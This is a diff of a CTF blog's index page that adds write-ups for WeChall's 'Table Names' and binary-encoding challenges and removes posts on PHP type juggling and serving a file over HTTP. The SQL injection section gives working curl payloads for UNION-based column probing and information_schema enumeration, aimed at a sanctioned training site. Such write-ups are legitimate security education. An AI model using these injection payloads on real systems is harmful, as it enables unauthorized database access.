@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">339</span>
+          <span class="site-state-item-count">341</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">206</span>
+        <span class="site-state-item-count">211</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,230 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-table-names/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-table-names/" class="post-title-link" itemprop="url">WeChall - Table Names</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-06 16:46:13 / Modified: 16:46:16" itemprop="dateCreated datePublished" datetime="2026-06-06T16:46:13+08:00">2026-06-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-table-names/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-table-names/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>MySQL + Exploit, difficulty 4.79. 找出 SQL
+注入漏洞所用的数据库名和表名。无源码，有测试账号 test/test。</p>
+<p>答案格式: <code>databasename_tablename</code></p>
+<h3 id="solution">Solution</h3>
+<p>漏洞脚本是一个 GET 方法的登录表单，username 和 password 参数都存在
+SQL 注入。</p>
+<p>先用测试账号登录，确认正常响应：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=test&quot; --data-urlencode &quot;password=test&quot; --data-urlencode &quot;login=login&quot; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/table_names/challenge.php&#x27;</span><br><span class="line">Welcome back test</span><br><span class="line">Your personal welcome message is: This is a demo account, nothing here.</span><br></pre></td></tr></table></figure>
+<p>用户名和密码字段都可以注入。布尔盲注验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=test&#x27; OR &#x27;1&#x27;=&#x27;1&quot; --data-urlencode &quot;password=x&quot; --data-urlencode &quot;login=login&quot; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/table_names/challenge.php&#x27;</span><br><span class="line">Welcome back Aaron A. Aaronson</span><br></pre></td></tr></table></figure>
+<p>确认注入点后，用 UNION SELECT 探测列数。正常登录显示用户名和 welcome
+message 两个字段，猜测 2-3 列。逐一测试发现 3 列时 welcome message
+位置返回了 UNION 的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,1-- -&quot; --data-urlencode &quot;password=x&quot; --data-urlencode &quot;login=login&quot; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/table_names/challenge.php&#x27;</span><br><span class="line">... message is: 1 ...</span><br></pre></td></tr></table></figure>
+<p>第 3 列对应 welcome message 显示位置。提取数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,database()-- -&quot; ...</span><br><span class="line">message is: gizmore_tableu61</span><br></pre></td></tr></table></figure>
+<p>用 <code>hex()</code>
+确认：<code>67697A6D6F72655F7461626C65753631</code> →
+<code>gizmore_tableu61</code>。</p>
+<p>枚举该数据库下的表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)-- -&quot; ...</span><br><span class="line">message is: aaawrong</span><br><span class="line"></span><br><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)-- -&quot; ...</span><br><span class="line">message is: usertableus4</span><br></pre></td></tr></table></figure>
+<p>两个表：<code>aaawrong</code>（陷阱）和
+<code>usertableus4</code>（用户表）。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">gizmore_tableu61_usertableus4</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-cgx-03-binary-encoding/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-cgx-03-binary-encoding/" class="post-title-link" itemprop="url">WeChall - CGX#3 - Binary Encoding</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-06 16:40:08 / Modified: 16:40:09" itemprop="dateCreated datePublished" datetime="2026-06-06T16:40:08+08:00">2026-06-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-cgx-03-binary-encoding/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-cgx-03-binary-encoding/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>The page shows a random 8-bit binary string and asks for its decimal
+equivalent:</p>
+<blockquote>
+<p>Please convert this binary data to a decimal number. 01100101</p>
+</blockquote>
+<p>The number is randomly generated and bound to your session.</p>
+<h3 id="solution">Solution</h3>
+<p>Convert with Python or JavaScript:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">parseInt</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure>
+<p>Manual: each bit position is a power of 2, from right (2^0) to left
+(2^7). <code>01100101</code> = 64+32+4+1 = 101.</p>
+<p>Since the challenge is session-bound, you'll see a different number
+each visit — the method stays the same.</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1465,229 +1689,8 @@ Me</a>;</span></span>
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-php-0818/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-php-0818/" class="post-title-link" itemprop="url">WeChall - PHP 0818</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-05 18:19:02 / Modified: 18:19:03" itemprop="dateCreated datePublished" datetime="2026-06-05T18:19:02+08:00">2026-06-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-php-0818/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-php-0818/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>PHP type juggling 挑战。源码要求输入一个 "magic number"，不能包含数字
-1-9，但必须等于 3735929054。</p>
-<h3 id="solution">Solution</h3>
-<p>源码关键逻辑:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$number</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$one</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    <span class="variable">$nine</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$number</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$number</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 禁止数字 1-9</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$number</span> == <span class="string">&quot;3735929054&quot;</span>;  <span class="comment">// loose comparison</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>数字 0 是允许的（只检查 1-9）。<code>3735929054</code> 的十六进制是
-<code>0xdeadc0de</code>，不包含 1-9。</p>
-<p>PHP 的 loose comparison (<code>==</code>) 遇到 <code>0x</code>
-前缀的字符串时，PHP 7.x 及更早版本会将其按十六进制解析为整数。所以
-<code>"0xdeadc0de" == "3735929054"</code> →
-<code>3735929054 == 3735929054</code> → <code>true</code>。</p>
-<p>这个技巧在 PHP 8.0+ 已被修复（hex string 不再被当作 numeric
-string），但 WeChall 仍运行在旧版 PHP 上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c <span class="string">&quot;print(0xdeadc0de)&quot;</span></span><br><span class="line"><span class="number">3735929054</span></span><br></pre></td></tr></table></figure>
-<p>提交入口在 <code>php0818.php</code>，POST 字段为
-<code>number</code>（不是 <code>answer</code>，也不需要 CSRF
-token）。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">0xdeadc0de</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-www-basics/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-training-www-basics/" class="post-title-link" itemprop="url">WeChall - Training - WWW-Basics</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-05 16:20:28 / Modified: 16:20:30" itemprop="dateCreated datePublished" datetime="2026-06-05T16:20:28+08:00">2026-06-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-training-www-basics/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-www-basics/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>在本机或公网服务器搭建 HTTP
-服务器，从外部可访问，提供指定路径和内容的文件。WeChall
-会从你登录时的来源 IP 发起回调验证。</p>
-<p>挑战页面会给出具体的参数（每个 session 不同）：</p>
-<ul>
-<li>URL 路径:
-<code>http://&lt;IP&gt;:&lt;port&gt;/&lt;USER&gt;/&lt;USER&gt;.html</code></li>
-<li>文件内容:
-<code>My name is &lt;USER&gt; and iChall.</code>（精确字节数）</li>
-<li>字节数要求精确，不能多换行符</li>
-</ul>
-<h3 id="solution">Solution</h3>
-<p>核心问题: WeChall 根据你登录时的来源 IP 发起回调验证。如果你的机器在
-NAT/VPN 后面没有公网 IP，就无法直接验证。</p>
-<p>解决方案: 在一台有公网 IP 的服务器上（VPS）搭建 Web
-服务，从该服务器登录 WeChall 并提交。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 在公网服务器上创建文件（USER 替换为 challenge 页面给你的值）</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/&lt;USER&gt;</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;My name is &lt;USER&gt; and iChall.&#x27;</span> &gt; /tmp/&lt;USER&gt;/&lt;USER&gt;.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 启动 HTTP 服务器</span></span><br><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; python3 -m http.server &lt;PORT&gt; &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 用 Python 从服务器登录 WeChall 并提交端口</span></span><br><span class="line">python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">import urllib.request, urllib.parse, http.cookiejar</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cj = http.cookiejar.MozillaCookieJar()</span></span><br><span class="line"><span class="string">opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))</span></span><br><span class="line"><span class="string">opener.addheaders = [(&#x27;User-Agent&#x27;, &#x27;Mozilla/5.0&#x27;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Login (填入自己的 WeChall 账号)</span></span><br><span class="line"><span class="string">opener.open(&#x27;https://www.wechall.net/en/login&#x27;, timeout=30)</span></span><br><span class="line"><span class="string">data = urllib.parse.urlencode(&#123;&#x27;username&#x27;:&#x27;&lt;WC_USER&gt;&#x27;,&#x27;password&#x27;:&#x27;&lt;WC_PASS&gt;&#x27;,&#x27;login&#x27;:&#x27;Login&#x27;&#125;).encode()</span></span><br><span class="line"><span class="string">opener.open(urllib.request.Request(&#x27;https://www.wechall.net/en/login&#x27;, data=data), timeout=30)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Submit port</span></span><br><span class="line"><span class="string">data = urllib.parse.urlencode(&#123;&#x27;port&#x27;:&#x27;&lt;PORT&gt;&#x27;,&#x27;go&#x27;:&#x27;I have set it up. Please check my server.&#x27;&#125;).encode()</span></span><br><span class="line"><span class="string">opener.open(urllib.request.Request(&#x27;https://www.wechall.net/en/challenge/training/www/basic/index.php&#x27;, data=data), timeout=30)</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/9/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/35/">35</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/9/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
